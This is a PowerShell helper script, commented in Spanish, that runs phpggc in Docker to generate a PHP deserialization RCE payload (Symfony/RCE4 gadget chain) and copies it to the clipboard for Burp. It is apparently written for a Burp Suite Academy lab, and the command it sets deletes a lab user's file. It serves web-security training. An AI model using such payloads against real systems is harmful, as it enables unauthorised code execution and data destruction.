# ============================================================
#  phpggc runner para Windows (via Docker)
#  Editá las 3 variables de abajo y corré:  .\gen-payload.ps1
# ============================================================

# --- EDITAR ACA ---
$Chain   = "Symfony/RCE4"                       # cadena de gadgets (ver lista abajo)
$Command = "rm /home/carlos/morale.txt"         # comando a ejecutar en la victima
$Flags   = "-b"                                 # -b base64 | -u urlencode | -a ascii-safe
# ------------------

# Carpeta base: si se corre como archivo usa $PSScriptRoot;
# si se pega en la consola cae a la ruta fija del proyecto.
$BaseDir = $PSScriptRoot
if (-not $BaseDir) {
    $BaseDir = "C:\Users\XPATHER\Desktop\BurpSuite Academy\insecure_deserialization\PHP"
}
$PhpggcDir = Join-Path $BaseDir "phpggc"

if (-not (Test-Path $PhpggcDir)) {
    Write-Host "[X] No encuentro la carpeta phpggc en: $PhpggcDir" -ForegroundColor Red
    exit 1
}

# 1) Verificar que Docker responda; si no, intentar levantar Docker Desktop
docker info *> $null
if ($LASTEXITCODE -ne 0) {
    Write-Host "[*] Docker no responde. Levantando Docker Desktop..." -ForegroundColor Yellow
    Start-Process "C:\Program Files\Docker\Docker\Docker Desktop.exe" -ErrorAction SilentlyContinue

    Write-Host "[*] Esperando a que arranque el engine..." -ForegroundColor Yellow
    $ok = $false
    for ($i = 0; $i -lt 60; $i++) {
        Start-Sleep -Seconds 2
        docker info *> $null
        if ($LASTEXITCODE -eq 0) { $ok = $true; break }
    }
    if (-not $ok) {
        Write-Host "[X] Docker no arranco. Abri Docker Desktop a mano y volve a correr." -ForegroundColor Red
        exit 1
    }
}
Write-Host "[+] Docker OK" -ForegroundColor Green

# 2) Armar argumentos de phpggc (separando el comando en palabras)
$phpggcArgs = @($Chain, "exec", $Command)
if ($Flags.Trim()) { $phpggcArgs += $Flags.Split(" ") }

Write-Host "[*] Chain   : $Chain"
Write-Host "[*] Comando : $Command"
Write-Host "[*] Flags   : $Flags"
Write-Host ""

# 3) Correr phpggc dentro del contenedor PHP
$payload = docker run --rm -v "${PhpggcDir}:/phpggc" -w /phpggc php:8.2-cli php phpggc @phpggcArgs

Write-Host "=================== PAYLOAD ===================" -ForegroundColor Cyan
Write-Host $payload
Write-Host "==============================================" -ForegroundColor Cyan

# 4) Copiar al portapapeles asi lo pegas directo en Burp
$payload | Set-Clipboard
Write-Host "[+] Copiado al portapapeles" -ForegroundColor Green

# --- Tip: para ver la lista de cadenas disponibles, descomenta y corre esto: ---
# docker run --rm -v "${PhpggcDir}:/phpggc" -w /phpggc php:8.2-cli php phpggc -l Symfony
